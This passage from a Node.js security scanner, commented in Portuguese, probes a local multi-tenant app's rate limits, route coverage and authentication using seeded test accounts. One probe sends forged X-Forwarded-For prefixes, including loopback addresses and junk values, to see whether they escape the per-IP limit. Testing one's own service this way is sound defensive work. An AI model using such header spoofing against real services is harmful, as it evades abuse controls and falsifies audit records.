      if (!cookie.startsWith('cofre=')) throw new Error('não entrou no alvo de freio: ' + r.status);
      let travou = 0;
      for (let i = 0; i < 40; i++) {
        const rr = await pedir('/api/projetos', { headers: { cookie, 'X-Forwarded-For': '203.0.113.7' } });
        if (rr.status === 429) { travou = i; break; }
      }
      if (!travou) achado('media', 'sem teto por sessão', '40 chamadas seguidas e nenhuma recusa');
    });

    await sonda('origem única não varre a porta de entrada', async () => {
      let travou = 0;
      for (let i = 0; i < 40; i++) {
        const rr = await pedir('/api/cadastro', { headers: { 'X-Forwarded-For': '198.51.100.9' } });
        if (rr.status === 429) { travou = i; break; }
      }
      if (!travou) achado('media', 'sem teto por origem', '40 chamadas de um IP e nenhuma recusa');
    });

    /* A pergunta que decide se o freio acima vale alguma coisa: quem é a
     * "origem", e quem escolhe o valor dela. */
    /* O que decide se o freio acima vale alguma coisa: quem é a "origem", e
     * quem escreve esse valor. Com um proxy na frente, o cliente escreve o
     * começo da lista e o proxy acrescenta o endereço verdadeiro no fim.
     * Então prefixo forjado não pode mudar de identidade. */
    await sonda('prefixo forjado em X-Forwarded-For não zera o freio', async () => {
      const comoProxy = escrito => ({ 'X-Forwarded-For': escrito + '198.51.100.9' });
      for (let i = 0; i < 40; i++) await pedir('/api/cadastro', { headers: comoProxy('') });

      const travado = await pedir('/api/cadastro', { headers: comoProxy('') });
      if (travado.status !== 429) throw new Error('o freio de origem não engatou; sonda inconclusiva');

      const disfarces = [
        ['198.51.100.77, ', 'outro endereço na frente'],
        ['127.0.0.1, ', 'dizer-se loopback para pegar a isenção'],
        ['::1, ', 'loopback em IPv6'],
        ['nao-e-um-ip, , ', 'lixo para desalinhar a lista']
      ];
      for (const [prefixo, oque] of disfarces) {
        const r = await pedir('/api/cadastro', { headers: comoProxy(prefixo) });
        if (r.status !== 429) {
          achado('alta', 'X-Forwarded-For do cliente troca a identidade da origem: ' + oque,
            'o teto por IP não segura varredura nenhuma, e o endereço gravado '
            + 'na auditoria passa a ser escolhido por quem chama');
        }
      }
    });
  } finally {
    try { proc.kill(); } catch (e) {}
  }
}

/* ------------------------------------------------ inventário de rotas */

/* Um scanner com lista fixa envelhece sem avisar: a rota nova entra e ele
 * continua verde porque nunca ouviu falar dela. Aqui a lista do código é a
 * verdade, e a divergência é o achado. */
async function sondaDeInventario() {
  console.log('\ninventário\n');
  await sonda('toda rota do código está nesta varredura', async () => {
    const fonte = fs.readFileSync(path.join(__dirname, 'cofre', 'api.js'), 'utf8');
    const vistas = new Set();

    for (const m of fonte.matchAll(/p === '(\/api\/[^']*)'([\s\S]{0,90}?)(?=\n)/g)) {
      const metodos = [...m[2].matchAll(/req\.method === '(\w+)'/g)].map(x => x[1]);
      (metodos.length ? metodos : ['GET']).forEach(v => vistas.add(v + ' ' + m[1]));
    }
    for (const m of fonte.matchAll(/\/\^\\\/api\\\/([^$]*)\$\/\.exec\(p\)([\s\S]{0,260}?)(?=\n\s*\/\*|$)/g)) {
      const molde = '/api/' + m[1].replace(/\\\//g, '/').replace(/\(\[\\w-\]\+\)/g, 'qualquer');
      for (const v of m[2].matchAll(/req\.method === '(\w+)'/g)) vistas.add(v[1] + ' ' + molde);
    }

    const cobertas = new Set([...PUBLICAS, ...PROTEGIDAS.map(([m, c]) => m + ' ' + c)]);
    const novas = [...vistas].filter(r => !cobertas.has(r));
    if (novas.length) {
      achado('media', 'rota fora da varredura',
        novas.join(', ') + '. Decida se exige sessão e acrescente em PUBLICAS ou PROTEGIDAS');
    }
    if (vistas.size < 15) throw new Error('só achei ' + vistas.size + ' rotas no api.js: a leitura do código quebrou');
  });
}

/* ------------------------------------------------------------ execução */

async function semear(arquivo) {
  const banco = require('./cofre/banco.js');
  const contas = require('./cofre/contas.js');
  const senha = 'senha-bem-longa-1';
  const h = contas.hashSenha(senha);

  banco.abrir(arquivo);
  const a = banco.criarTenant('Cliente A', 90);
  const b = banco.criarTenant('Cliente B', 90);

  const conta = (email, tenant, papel) => {
    const u = banco.criarUsuario(email, h);
    banco.vincular(tenant.id, u.id, papel);
    return email;
  };

  const alvoA = {
    tenantId: a.id,
    admin: conta('admin-a@exemplo.com', a, 'admin'),
    gestor: conta('gestor-a@exemplo.com', a, 'gestor'),
    consultor: conta('consultor-a@exemplo.com', a, 'consultor'),
    leitor: conta('leitor-a@exemplo.com', a, 'leitor'),
    isca: conta('isca-a@exemplo.com', a, 'leitor')
  };
  const alvoB = { tenantId: b.id, admin: conta('admin-b@exemplo.com', b, 'admin') };
  conta('admin-freio@exemplo.com', a, 'admin');

  const uA = banco.usuarioPorEmail(alvoA.admin);
  const proj = banco.criarProjeto(a.id, uA.id, 'Projeto do A', 'A');
  const exec = banco.criarExecucao(a.id, uA.id, proj.id, 'Execução do A');
  const ev = banco.criarEvidencia(a.id, uA.id, exec.id, { ordem: 1, titulo: 'Print do A' }, 90);
  const obj = banco.anexar(a.id, ev.id, 'antes', 'image/png', Buffer.from(PIXEL.split(',')[1], 'base64'));

  alvoA.projetoId = proj.id;
  alvoA.execucaoId = exec.id;
  alvoA.evidenciaId = ev.id;
  alvoA.objetoId = obj.id || obj;
  banco.fechar();

  return { alvoA, alvoB, senha };
}

async function principal() {
  console.log('\nvarredura dinâmica · alvo ' + BASE + (ALVO ? '  (externo: só sondas que não gravam)' : '') + '\n');

  let proc = null;
  let arquivo = null;
  let sementes = null;

  if (!ALVO) {
    arquivo = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'dast-')), 'cofre.db');
    sementes = await semear(arquivo);
    proc = spawn(process.execPath, [path.join(__dirname, 'servidor.js')], {
      /* 0.0.0.0 e não loopback: em loopback o servidor solta o portão de
       * propósito, e varrer um alvo com a tranca aberta não mede nada. */
      env: Object.assign({}, process.env, {
        PORT: String(PORTA), HOST: '0.0.0.0',
        COFRE_BANCO: arquivo, COFRE_SEGREDO: 'segredo-de-sonda',
        /* Como em produção: o domínio público vem do ambiente, e não do
         * cabeçalho do pedido. Sem isto a sonda mediria uma instalação que
         * ninguém configurou, e não a que está no ar. */
        PONTE_HOST: '127.0.0.1',
        AGENTE_API_KEY: '', PONTE_TOKEN: ''
      }),
      stdio: ['ignore', 'pipe', 'pipe']
    });
    proc.stdout.resume();
    proc.stderr.resume();
    for (let i = 0; i < 120; i++) {
      try { const r = await fetch(BASE + '/ping'); if (r.ok) { await r.text(); break; } } catch (e) {}
      await new Promise(r => setTimeout(r, 250));
    }
  }

  try {
    await sondasAbertas();
    if (!ALVO) {
      await sondasAutenticadas(sementes);
      await sondaDeInventario();
    }
  } finally {
    if (proc) { try { proc.kill(); } catch (e) {} }
  }

  if (!ALVO) await sondasDeFreio(arquivo);

  /* ---------- relatório ---------- */

  achados.sort((x, y) => PESO[x.gravidade] - PESO[y.gravidade]);
  const conta = g => achados.filter(a => a.gravidade === g).length;

  console.log('\n' + '-'.repeat(64));
  console.log(sondas + ' sondas · ' + achados.length + ' achado(s)');
  console.log('críticas ' + conta('critica') + ' · altas ' + conta('alta')
    + ' · médias ' + conta('media') + ' · baixas ' + conta('baixa'));

  if (achados.length) {
    console.log('');
    for (const a of achados) {
      console.log('[' + a.gravidade.toUpperCase() + '] ' + a.titulo);
      console.log('    ' + a.detalhe.replace(/\n/g, ' ').slice(0, 300));
    }
  }
  console.log('-'.repeat(64) + '\n');

  /* Média e baixa não param o build: quem faz o alarme tocar todo dia por
   * algo conhecido ensina o time a ignorar o alarme. */
  const graves = conta('critica') + conta('alta');
  process.exit(graves ? 1 : 0);
}

principal().catch(err => {
  console.log('\nA VARREDURA NÃO RODOU: ' + err.message);
  console.log(err.stack);
  process.exit(2);
});
